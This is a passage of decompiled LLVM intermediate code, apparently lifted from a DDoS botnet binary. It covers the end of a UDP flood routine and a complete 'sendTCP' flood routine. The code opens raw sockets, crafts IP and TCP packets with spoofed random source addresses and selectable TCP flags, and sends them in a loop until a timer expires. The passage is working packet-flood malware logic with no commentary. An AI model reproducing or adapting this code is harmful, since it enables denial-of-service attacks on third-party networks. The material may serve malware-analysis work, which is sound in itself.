  store i32 %v1_100050c0, i32* @r3, align 4
  %v1_100050cc = call i32 @htonl(i32 %v1_100050c0)
  %v1_100050d8 = add i32 %arg5, 8
  %v6_100050f0 = inttoptr i32 %v1_10005090 to i32*
  %v7_100050f0 = call i32 @makeIPPacket(i32* %v6_100050f0, i32 %v3_100050b8, i32 %v1_100050cc, i32 17, i32 %v1_100050d8, i32 %arg5)
  %v1_10005100 = urem i32 %v1_100050d8, 65536
  store i32 %v1_10005100, i32* @r3, align 4
  %v1_10005108 = call i32 @htons(i32 %v1_10005100)
  %sext = mul i32 %v1_10005108, 65536
  %v1_1000510c = sdiv i32 %sext, 65536
  %v1_10005114 = trunc i32 %v1_1000510c to i16
  %v3_10005114 = add i32 %v1_10005090, 24
  %v4_10005114 = inttoptr i32 %v3_10005114 to i16*
  store i16 %v1_10005114, i16* %v4_10005114, align 8
  %v0_10005118 = call i32 @rand_cmwc()
  %v1_10005128 = trunc i32 %v0_10005118 to i16
  store i16 %v1_10005128, i16* %v5_100050b4, align 4
  br i1 %v3_10004d30, label %dec_label_pc_10005138, label %dec_label_pc_1000514c

dec_label_pc_10005138:                            ; preds = %dec_label_pc_10005054
  %v0_10005138 = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_10005138 to i16
  br label %dec_label_pc_10005164

dec_label_pc_1000514c:                            ; preds = %dec_label_pc_10005054
  %v1_10005150 = urem i32 %arg2, 65536
  store i32 %v1_10005150, i32* @r3, align 4
  %v1_10005158 = call i32 @htons(i32 %v1_10005150)
  %extract.t = trunc i32 %v1_10005158 to i16
  br label %dec_label_pc_10005164

dec_label_pc_10005164:                            ; preds = %dec_label_pc_10005138, %dec_label_pc_1000514c
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_1000514c ], [ %extract.t87, %dec_label_pc_10005138 ]
  %v1_10005244.pre-phi = phi i32 [ %v1_10005150, %dec_label_pc_1000514c ], [ 0, %dec_label_pc_10005138 ]
  %v3_1000516c = add i32 %v1_10005090, 22
  %v4_1000516c = inttoptr i32 %v3_1000516c to i16*
  store i16 %storemerge78.off0, i16* %v4_1000516c, align 2
  %v3_10005178 = add i32 %v1_10005090, 26
  %v4_10005178 = inttoptr i32 %v3_10005178 to i16*
  store i16 0, i16* %v4_10005178, align 2
  %v1_10005180 = add i32 %v1_10005090, 28
  %v2_1000518c = call i32 @makeRandomStr(i32 %v1_10005180, i32 %arg5)
  %v1_1000519c = or i32 %v1_10005090, 2
  %v2_1000519c = inttoptr i32 %v1_1000519c to i16*
  %v3_1000519c = load i16, i16* %v2_1000519c, align 2
  %v4_1000519c = zext i16 %v3_1000519c to i32
  %v5_100051ac = inttoptr i32 %v1_10005090 to i16*
  %v6_100051ac = call i32 @csum(i16* %v5_100051ac, i32 %v4_1000519c, i32 %v1_10005090, i32 17, i32 %v1_100050d8)
  %sext4 = mul i32 %v6_100051ac, 65536
  %v1_100051b0 = sdiv i32 %sext4, 65536
  %v1_100051b8 = trunc i32 %v1_100051b0 to i16
  %v3_100051b8 = or i32 %v1_10005090, 10
  %v4_100051b8 = inttoptr i32 %v3_100051b8 to i16*
  store i16 %v1_100051b8, i16* %v4_100051b8, align 2
  store i32 268456388, i32* @lr, align 4
  %v1_100051c0 = call i32 @__GI_time(i32 0)
  %v2_100051cc = add i32 %v1_100051c0, %arg3
  %v3_10005274 = or i32 %v1_10005090, 4
  %v4_10005274 = inttoptr i32 %v3_10005274 to i16*
  %v2_10005294 = or i32 %v1_10005090, 12
  %v3_10005294 = inttoptr i32 %v2_10005294 to i32*
  %v1_10005318 = mul i32 %v0_10004d20, 1000
  br label %dec_label_pc_100051e8.outer

dec_label_pc_100051e8.outer:                      ; preds = %dec_label_pc_100051e8.outer.backedge, %dec_label_pc_10005164
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_10005164 ], [ %storemerge26, %dec_label_pc_100051e8.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10005164 ], [ %v1_100052fc, %dec_label_pc_100051e8.outer.backedge ]
  br label %dec_label_pc_100051e8

dec_label_pc_100051e8:                            ; preds = %dec_label_pc_100051e8.outer, %dec_label_pc_100052ec
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_100052ec ], [ %stack_var_-52.0.ph, %dec_label_pc_100051e8.outer ]
  store i32 268456460, i32* @lr, align 4
  %v7_10005208 = call i32 @__libc_sendto(i32 %v3_10004f40, i32 %v1_10005090, i32 %v1_10005058, i32 0, i32 %v2_10004d64, i32 16, i32 %v2_10004d64)
  %v0_1000520c = call i32 @rand_cmwc()
  %v1_1000521c = trunc i32 %v0_1000520c to i16
  store i16 %v1_1000521c, i16* %v5_100050b4, align 4
  br i1 %v3_10004d30, label %dec_label_pc_1000522c, label %dec_label_pc_10005240

dec_label_pc_1000522c:                            ; preds = %dec_label_pc_100051e8
  %v0_1000522c = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_1000522c to i16
  br label %dec_label_pc_10005258

dec_label_pc_10005240:                            ; preds = %dec_label_pc_100051e8
  store i32 %v1_10005244.pre-phi, i32* @r3, align 4
  %v1_1000524c = call i32 @htons(i32 %v1_10005244.pre-phi)
  %extract.t88 = trunc i32 %v1_1000524c to i16
  br label %dec_label_pc_10005258

dec_label_pc_10005258:                            ; preds = %dec_label_pc_1000522c, %dec_label_pc_10005240
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_10005240 ], [ %extract.t89, %dec_label_pc_1000522c ]
  store i16 %storemerge80.off0, i16* %v4_1000516c, align 2
  %v0_10005264 = call i32 @rand_cmwc()
  %v1_10005274 = trunc i32 %v0_10005264 to i16
  store i16 %v1_10005274, i16* %v4_10005274, align 4
  %v1_1000527c = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_1000527c, i32* @r3, align 4
  %v1_10005288 = call i32 @htonl(i32 %v1_1000527c)
  store i32 %v1_10005288, i32* %v3_10005294, align 4
  %v3_100052a4 = load i16, i16* %v2_1000519c, align 2
  %v4_100052a4 = zext i16 %v3_100052a4 to i32
  %v6_100052b4 = call i32 @csum(i16* %v5_100051ac, i32 %v4_100052a4, i32 %v1_10005090, i32 0, i32 %v2_10004d64)
  %v1_100052c0 = trunc i32 %v6_100052b4 to i16
  store i16 %v1_100052c0, i16* %v4_100051b8, align 2
  %v4_100052cc = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_100052cc, label %dec_label_pc_100052d4, label %dec_label_pc_100052f8

dec_label_pc_100052d4:                            ; preds = %dec_label_pc_10005258
  store i32 268456668, i32* @lr, align 4
  %v1_100052d8 = call i32 @__GI_time(i32 0)
  %v3_100052e4 = icmp sgt i32 %v1_100052d8, %v2_100051cc
  br i1 %v3_100052e4, label %dec_label_pc_10005340, label %dec_label_pc_100052ec

dec_label_pc_100052ec:                            ; preds = %dec_label_pc_100052d4
  br label %dec_label_pc_100051e8

dec_label_pc_100052f8:                            ; preds = %dec_label_pc_10005258
  %v1_100052fc = add i32 %stack_var_-52.0, 1
  %v4_1000530c = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_1000530c, label %dec_label_pc_10005314, label %dec_label_pc_10005330

dec_label_pc_10005314:                            ; preds = %dec_label_pc_100052f8
  store i32 ptrtoint ([3 x i8]* @global_var_10005324.465 to i32), i32* @lr, align 4
  %v2_10005320 = call i32 @usleep(i32 %v1_10005318, i32 %arg7)
  br label %dec_label_pc_100051e8.outer.backedge

dec_label_pc_100051e8.outer.backedge:             ; preds = %dec_label_pc_10005314, %dec_label_pc_10005330
  %storemerge26 = phi i32 [ %v1_10005334, %dec_label_pc_10005330 ], [ 0, %dec_label_pc_10005314 ]
  br label %dec_label_pc_100051e8.outer

dec_label_pc_10005330:                            ; preds = %dec_label_pc_100052f8
  %v1_10005334 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_100051e8.outer.backedge

dec_label_pc_10005340:                            ; preds = %dec_label_pc_100052d4, %dec_label_pc_10004fa8, %dec_label_pc_10004f58
  %v0_1000536831 = phi i32 [ %v5_10004fc0, %dec_label_pc_10004fa8 ], [ %v5_10004f70, %dec_label_pc_10004f58 ], [ %v1_100052d8, %dec_label_pc_100052d4 ]
  br label %dec_label_pc_10005350

dec_label_pc_10005350:                            ; preds = %dec_label_pc_10004ec0, %dec_label_pc_10004d64, %dec_label_pc_10004df4, %dec_label_pc_10004dd4, %dec_label_pc_10005340
  %v0_10005368 = phi i32 [ %v4_10004d74, %dec_label_pc_10004d64 ], [ 0, %dec_label_pc_10004df4 ], [ %v5_10004dec, %dec_label_pc_10004dd4 ], [ %v0_1000536831, %dec_label_pc_10005340 ], [ %v1_10004ec4, %dec_label_pc_10004ec0 ]
  ret i32 %v0_10005368

; uselistorder directives
  uselistorder i32 %v1_10005244.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10005150, { 2, 1, 0 }
  uselistorder i32 %v1_10005100, { 1, 0 }
  uselistorder i32 %v1_100050d8, { 2, 0, 1 }
  uselistorder i32 %v1_10005090, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10004d64, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_10004d50, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10005350, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100051e8.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10005258, { 1, 0 }
  uselistorder label %dec_label_pc_100051e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005164, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10004fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10004e70.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10004ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e70, { 1, 0 }
  uselistorder label %dec_label_pc_10004d64, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000536c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000536c, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_100053bc = icmp eq i32 %arg2, 0
  br i1 %v3_100053bc, label %dec_label_pc_100053c4, label %dec_label_pc_100053d8

dec_label_pc_100053c4:                            ; preds = %entry
  %v0_100053c4 = call i32 @rand_cmwc()
  br label %dec_label_pc_100053f0

dec_label_pc_100053d8:                            ; preds = %entry
  %v1_100053dc = urem i32 %arg2, 65536
  store i32 %v1_100053dc, i32* @r3, align 4
  %v1_100053e4 = call i32 @htons(i32 %v1_100053dc)
  br label %dec_label_pc_100053f0

dec_label_pc_100053f0:                            ; preds = %dec_label_pc_100053c4, %dec_label_pc_100053d8
  %v2_100053f0 = ptrtoint i32* %stack_var_-92 to i32
  %v4_10005400 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_100053f0)
  %v3_10005408 = icmp eq i32 %v4_10005400, 0
  br i1 %v3_10005408, label %dec_label_pc_10005414, label %dec_label_pc_10005998

dec_label_pc_10005414:                            ; preds = %dec_label_pc_100053f0
  store i32 268457020, i32* @lr, align 4
  %v3_10005438 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_10005448 = icmp eq i32 %v3_10005438, 0
  br i1 %v3_10005448, label %dec_label_pc_10005450, label %dec_label_pc_10005470

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005414
  %v3_10005454 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_1000546c.466 to i32), i32* @lr, align 4
  %v5_10005468 = call i32 @Rootsprintf(i32 %v3_10005454, i32 ptrtoint ([27 x i8]* @global_var_10011f7c.457 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10005998

dec_label_pc_10005470:                            ; preds = %dec_label_pc_10005414
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10005478 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268457108, i32* @lr, align 4
  %v5_10005490 = call i32 @__GI_setsockopt(i32 %v3_10005438, i32 0, i32 3, i32 %v2_10005478, i32 4)
  %tmp59 = icmp sgt i32 %v5_10005490, -1
  br i1 %tmp59, label %dec_label_pc_100054c0, label %dec_label_pc_100054a0

dec_label_pc_100054a0:                            ; preds = %dec_label_pc_10005470
  %v3_100054a4 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_100054bc.467 to i32), i32* @lr, align 4
  %v5_100054b8 = call i32 @Rootsprintf(i32 %v3_100054a4, i32 ptrtoint ([33 x i8]* @global_var_10011f98.462 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10005998

dec_label_pc_100054c0:                            ; preds = %dec_label_pc_10005470
  %v3_100054c4 = icmp eq i32 %arg4, 0
  br i1 %v3_100054c4, label %dec_label_pc_100054f0, label %dec_label_pc_100054d8

dec_label_pc_100054d8:                            ; preds = %dec_label_pc_100054c0
  %v1_100054dc = sub i32 32, %arg4
  %v2_100054e4 = urem i32 %v1_100054dc, 64
  %v1_100054e8 = shl i32 -1, %v2_100054e4
  br label %dec_label_pc_100054f0

dec_label_pc_100054f0:                            ; preds = %dec_label_pc_100054c0, %dec_label_pc_100054d8
  %storemerge9 = phi i32 [ %v1_100054e8, %dec_label_pc_100054d8 ], [ 0, %dec_label_pc_100054c0 ]
  %v1_100054f4 = add i32 %arg6, 40
  %v1_10005504 = add i32 %arg6, 70
  %v1_10005508 = and i32 %v1_10005504, -16
  %v2_10005510 = load i32, i32* %stack_var_-128, align 4
  %v1_10005518 = load i32, i32* @r1, align 4
  %v3_10005518 = sub i32 %v1_10005518, %v1_10005508
  %v4_10005518 = inttoptr i32 %v3_10005518 to i32*
  store i32 %v2_10005510, i32* %v4_10005518, align 4
  %v1_10005528 = add i32 %v3_10005518, 23
  %v1_1000552c = and i32 %v1_10005528, -16
  %v1_1000554c = add i32 %v1_1000552c, 20
  %v5_10005550 = inttoptr i32 %v1_1000554c to i16*
  %v3_10005554 = load i32, i32* %stack_var_-88, align 4
  %v1_1000555c = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_1000555c, i32* @r3, align 4
  %v1_10005568 = call i32 @htonl(i32 %v1_1000555c)
  %v1_10005574 = add i32 %arg6, 20
  %v6_1000558c = inttoptr i32 %v1_1000552c to i32*
  %v7_1000558c = call i32 @makeIPPacket(i32* %v6_1000558c, i32 %v3_10005554, i32 %v1_10005568, i32 6, i32 %v1_10005574, i32 %arg6)
  %v0_10005590 = call i32 @rand_cmwc()
  %v1_100055a0 = trunc i32 %v0_10005590 to i16
  store i16 %v1_100055a0, i16* %v5_10005550, align 4
  %v0_100055a4 = call i32 @rand_cmwc()
  %v2_100055b0 = add i32 %v1_1000552c, 24
  %v3_100055b0 = inttoptr i32 %v2_100055b0 to i32*
  store i32 %v0_100055a4, i32* %v3_100055b0, align 8
  %v2_100055bc = add i32 %v1_1000552c, 28
  %v3_100055bc = inttoptr i32 %v2_100055bc to i32*
  store i32 0, i32* %v3_100055bc, align 4
  %v1_100055c4 = add i32 %v1_1000552c, 32
  %v2_100055c4 = inttoptr i32 %v1_100055c4 to i32*
  %v1_100055cc = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_100055d0 = add i32 %v1_1000552c, 32
  %v3_100055d0 = inttoptr i32 %v2_100055d0 to i32*
  store i32 %v1_100055cc, i32* %v3_100055d0, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10011fbc.468 to i32), i32* @r4, align 4
  %v3_100055e4 = inttoptr i32 %arg5 to i8*
  %v4_100055e4 = call i32 @__GI_strcoll(i8* %v3_100055e4, i32 ptrtoint ([4 x i8]* @global_var_10011fbc.468 to i32))
  %v3_100055ec = icmp eq i32 %v4_100055e4, 0
  br i1 %v3_100055ec, label %dec_label_pc_100055f4, label %dec_label_pc_10005648

dec_label_pc_100055f4:                            ; preds = %dec_label_pc_100054f0
  %v3_100055f8 = load i32, i32* %v2_100055c4, align 16
  %v1_1000563c = or i32 %v3_100055f8, 2031616
  store i32 %v1_1000563c, i32* %v2_100055c4, align 16
  br label %dec_label_pc_100057b0

dec_label_pc_10005648:                            ; preds = %dec_label_pc_100054f0
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268457564, i32* @lr, align 4
  %v4_10005658 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_100057a818 = icmp eq i32 %v4_10005658, 0
  br i1 %v3_100057a818, label %dec_label_pc_100057b0, label %dec_label_pc_10005668

dec_label_pc_10005668:                            ; preds = %dec_label_pc_10005648, %dec_label_pc_1000578c
  %storemerge1319 = phi i32 [ %v4_10005798, %dec_label_pc_1000578c ], [ %v4_10005658, %dec_label_pc_10005648 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10011fc4.470 to i32), i32* @r4, align 4
  %v3_10005678 = inttoptr i32 %storemerge1319 to i8*
  %v4_10005678 = call i32 @__GI_strcoll(i8* %v3_10005678, i32 ptrtoint ([4 x i8]* @global_var_10011fc4.470 to i32))
  %v3_10005680 = icmp eq i32 %v4_10005678, 0
  br i1 %v3_10005680, label %dec_label_pc_10005688, label %dec_label_pc_1000569c

dec_label_pc_10005688:                            ; preds = %dec_label_pc_10005668
  %v3_1000568c = load i32, i32* %v2_100055c4, align 16
  %v1_10005690 = or i32 %v3_1000568c, 131072
  store i32 %v1_10005690, i32* %v2_100055c4, align 16
  br label %dec_label_pc_1000578c

dec_label_pc_1000569c:                            ; preds = %dec_label_pc_10005668
  store i32 ptrtoint ([4 x i8]* @global_var_10011fc8.471 to i32), i32* @r4, align 4
  %v4_100056ac = call i32 @__GI_strcoll(i8* %v3_10005678, i32 ptrtoint ([4 x i8]* @global_var_10011fc8.471 to i32))
  %v3_100056b4 = icmp eq i32 %v4_100056ac, 0
  br i1 %v3_100056b4, label %dec_label_pc_100056bc, label %dec_label_pc_100056d0

dec_label_pc_100056bc:                            ; preds = %dec_label_pc_1000569c
  %v3_100056c0 = load i32, i32* %v2_100055c4, align 16
  %v1_100056c4 = or i32 %v3_100056c0, 262144
  store i32 %v1_100056c4, i32* %v2_100055c4, align 16
  br label %dec_label_pc_1000578c

dec_label_pc_100056d0:                            ; preds = %dec_label_pc_1000569c
  store i32 ptrtoint ([4 x i8]* @global_var_10011fcc.472 to i32), i32* @r4, align 4
  %v4_100056e0 = call i32 @__GI_strcoll(i8* %v3_10005678, i32 ptrtoint ([4 x i8]* @global_var_10011fcc.472 to i32))
  %v3_100056e8 = icmp eq i32 %v4_100056e0, 0
  br i1 %v3_100056e8, label %dec_label_pc_100056f0, label %dec_label_pc_10005704

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_100056d0
  %v3_100056f4 = load i32, i32* %v2_100055c4, align 16
  %v1_100056f8 = or i32 %v3_100056f4, 65536
  store i32 %v1_100056f8, i32* %v2_100055c4, align 16
  br label %dec_label_pc_1000578c

dec_label_pc_10005704:                            ; preds = %dec_label_pc_100056d0
  store i32 ptrtoint ([4 x i8]* @global_var_10011fd0.473 to i32), i32* @r4, align 4
  %v4_10005714 = call i32 @__GI_strcoll(i8* %v3_10005678, i32 ptrtoint ([4 x i8]* @global_var_10011fd0.473 to i32))
  %v3_1000571c = icmp eq i32 %v4_10005714, 0
  br i1 %v3_1000571c, label %dec_label_pc_10005724, label %dec_label_pc_10005738

dec_label_pc_10005724:                            ; preds = %dec_label_pc_10005704
  %v3_10005728 = load i32, i32* %v2_100055c4, align 16
  %v1_1000572c = or i32 %v3_10005728, 1048576
  store i32 %v1_1000572c, i32* %v2_100055c4, align 16
  br label %dec_label_pc_1000578c

dec_label_pc_10005738:                            ; preds = %dec_label_pc_10005704
  store i32 ptrtoint ([4 x i8]* @global_var_10011fd4.474 to i32), i32* @r4, align 4
  %v4_10005748 = call i32 @__GI_strcoll(i8* %v3_10005678, i32 ptrtoint ([4 x i8]* @global_var_10011fd4.474 to i32))
  %v3_10005750 = icmp eq i32 %v4_10005748, 0
  br i1 %v3_10005750, label %dec_label_pc_10005758, label %dec_label_pc_1000576c

dec_label_pc_10005758:                            ; preds = %dec_label_pc_10005738
  %v3_1000575c = load i32, i32* %v2_100055c4, align 16
  %v1_10005760 = or i32 %v3_1000575c, 524288
  store i32 %v1_10005760, i32* %v2_100055c4, align 16
  br label %dec_label_pc_1000578c

dec_label_pc_1000576c:                            ; preds = %dec_label_pc_10005738
  %v3_10005770 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000578c.476 to i32), i32* @lr, align 4
  %v5_10005788 = call i32 @Rootsprintf(i32 %v3_10005770, i32 ptrtoint ([18 x i8]* @global_var_10011fd8.475 to i32), i32 %storemerge1319)
  br label %dec_label_pc_1000578c

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_10005758, %dec_label_pc_10005724, %dec_label_pc_100056f0, %dec_label_pc_100056bc, %dec_label_pc_10005688, %dec_label_pc_1000576c
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268457884, i32* @lr, align 4
  %v4_10005798 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_100057a8 = icmp eq i32 %v4_10005798, 0
  br i1 %v3_100057a8, label %dec_label_pc_100057b0, label %dec_label_pc_10005668

dec_label_pc_100057b0:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005648, %dec_label_pc_100055f4
  %v0_100057b0 = call i32 @rand_cmwc()
  %v1_100057c0 = trunc i32 %v0_100057b0 to i16
  %v3_100057c0 = add i32 %v1_1000552c, 34
  %v4_100057c0 = inttoptr i32 %v3_100057c0 to i16*
  store i16 %v1_100057c0, i16* %v4_100057c0, align 2
  %v3_100057cc = add i32 %v1_1000552c, 36
  %v4_100057cc = inttoptr i32 %v3_100057cc to i16*
  store i16 0, i16* %v4_100057cc, align 4
  %v3_100057d8 = add i32 %v1_1000552c, 38
  %v4_100057d8 = inttoptr i32 %v3_100057d8 to i16*
  store i16 0, i16* %v4_100057d8, align 2
  br i1 %v3_100053bc, label %dec_label_pc_100057e8, label %dec_label_pc_100057fc

dec_label_pc_100057e8:                            ; preds = %dec_label_pc_100057b0
  %v0_100057e8 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_100057e8 to i16
  br label %dec_label_pc_10005814

dec_label_pc_100057fc:                            ; preds = %dec_label_pc_100057b0
  %v1_10005800 = urem i32 %arg2, 65536
  store i32 %v1_10005800, i32* @r3, align 4
  %v1_10005808 = call i32 @htons(i32 %v1_10005800)
  %extract.t = trunc i32 %v1_10005808 to i16
  br label %dec_label_pc_10005814

dec_label_pc_10005814:                            ; preds = %dec_label_pc_100057e8, %dec_label_pc_100057fc
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_100057fc ], [ %extract.t63, %dec_label_pc_100057e8 ]
  %v3_1000581c = add i32 %v1_1000552c, 22
  %v4_1000581c = inttoptr i32 %v3_1000581c to i16*
  store i16 %storemerge60.off0, i16* %v4_1000581c, align 2
  store i32 268458028, i32* @lr, align 4
  %v3_10005828 = inttoptr i32 %v1_1000554c to i32*
  %v4_10005828 = call i32 @tcpcsum(i32 %v1_1000552c, i32* %v3_10005828, i32 %v1_1000554c)
  %v1_10005834 = trunc i32 %v4_10005828 to i16
  store i16 %v1_10005834, i16* %v4_100057cc, align 4
  %v1_10005844 = or i32 %v1_1000552c, 2
  %v2_10005844 = inttoptr i32 %v1_10005844 to i16*
  %v3_10005844 = load i16, i16* %v2_10005844, align 2
  %v4_10005844 = zext i16 %v3_10005844 to i32
  %v5_10005854 = inttoptr i32 %v1_1000552c to i16*
  %v6_10005854 = call i32 @csum(i16* %v5_10005854, i32 %v4_10005844, i32 %v1_1000552c, i32 6, i32 %v1_10005574)
  %sext3 = mul i32 %v6_10005854, 65536
  %v1_10005858 = sdiv i32 %sext3, 65536
  %v1_10005860 = trunc i32 %v1_10005858 to i16
  %v3_10005860 = or i32 %v1_1000552c, 10
  %v4_10005860 = inttoptr i32 %v3_10005860 to i16*
  store i16 %v1_10005860, i16* %v4_10005860, align 2
  store i32 268458092, i32* @lr, align 4
  %v1_10005868 = call i32 @__GI_time(i32 0)
  %v2_10005874 = add i32 %v1_10005868, %arg3
  %v2_100058c8 = or i32 %v1_1000552c, 12
  %v3_100058c8 = inttoptr i32 %v2_100058c8 to i32*
  %v3_100058dc = or i32 %v1_1000552c, 4
  %v4_100058dc = inttoptr i32 %v3_100058dc to i16*
  br label %dec_label_pc_10005888

dec_label_pc_10005888:                            ; preds = %dec_label_pc_10005888.backedge, %dec_label_pc_10005814
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10005814 ], [ %storemerge22, %dec_label_pc_10005888.backedge ]
  store i32 268458156, i32* @lr, align 4
  %v7_100058a8 = call i32 @__libc_sendto(i32 %v3_10005438, i32 %v1_1000552c, i32 %v1_100054f4, i32 0, i32 %v2_100053f0, i32 16, i32 %v2_100053f0)
  %v1_100058b0 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_100058b0, i32* @r3, align 4
  %v1_100058bc = call i32 @htonl(i32 %v1_100058b0)
  store i32 %v1_100058bc, i32* %v3_100058c8, align 4
  %v0_100058cc = call i32 @rand_cmwc()
  %v1_100058dc = trunc i32 %v0_100058cc to i16
  store i16 %v1_100058dc, i16* %v4_100058dc, align 4
  %v0_100058e0 = call i32 @rand_cmwc()
  store i32 %v0_100058e0, i32* %v3_100055b0, align 8
  %v0_100058f0 = call i32 @rand_cmwc()
  %v1_10005900 = trunc i32 %v0_100058f0 to i16
  store i16 %v1_10005900, i16* %v5_10005550, align 4
  store i16 0, i16* %v4_100057cc, align 4
  store i32 268458268, i32* @lr, align 4
  %v4_10005918 = call i32 @tcpcsum(i32 %v1_1000552c, i32* %v3_10005828, i32 %v1_1000554c)
  %v1_10005924 = trunc i32 %v4_10005918 to i16
  store i16 %v1_10005924, i16* %v4_100057cc, align 4
  %v3_10005934 = load i16, i16* %v2_10005844, align 2
  %v4_10005934 = zext i16 %v3_10005934 to i32
  %v6_10005944 = call i32 @csum(i16* %v5_10005854, i32 %v4_10005934, i32 %v1_1000552c, i32 0, i32 %v2_100053f0)
  %v1_10005950 = trunc i32 %v6_10005944 to i16
  store i16 %v1_10005950, i16* %v4_10005860, align 2
  %v4_1000595c = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_1000595c, label %dec_label_pc_10005964, label %dec_label_pc_10005988

dec_label_pc_10005964:                            ; preds = %dec_label_pc_10005888
  store i32 268458348, i32* @lr, align 4
  %v1_10005968 = call i32 @__GI_time(i32 0)
  %v3_10005974 = icmp sgt i32 %v1_10005968, %v2_10005874
  br i1 %v3_10005974, label %dec_label_pc_10005998, label %dec_label_pc_10005888.backedge

dec_label_pc_10005888.backedge:                   ; preds = %dec_label_pc_10005964, %dec_label_pc_10005988
  %storemerge22 = phi i32 [ %v1_1000598c, %dec_label_pc_10005988 ], [ 0, %dec_label_pc_10005964 ]
  br label %dec_label_pc_10005888

dec_label_pc_10005988:                            ; preds = %dec_label_pc_10005888
  %v1_1000598c = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10005888.backedge

dec_label_pc_10005998:                            ; preds = %dec_label_pc_10005964, %dec_label_pc_100053f0, %dec_label_pc_100054a0, %dec_label_pc_10005450
  %v0_100059c0 = phi i32 [ %v4_10005400, %dec_label_pc_100053f0 ], [ %v5_100054b8, %dec_label_pc_100054a0 ], [ %v5_10005468, %dec_label_pc_10005450 ], [ %v1_10005968, %dec_label_pc_10005964 ]
  ret i32 %v0_100059c0

; uselistorder directives
  uselistorder i32 %v1_10005800, { 1, 0 }
  uselistorder i32 %v4_10005798, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_100055c4, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_10005574, { 1, 0 }
  uselistorder i32 %v1_1000554c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000552c, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_100053f0, { 1, 3, 2, 0 }
  uselistorder i32 %v1_100053dc, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
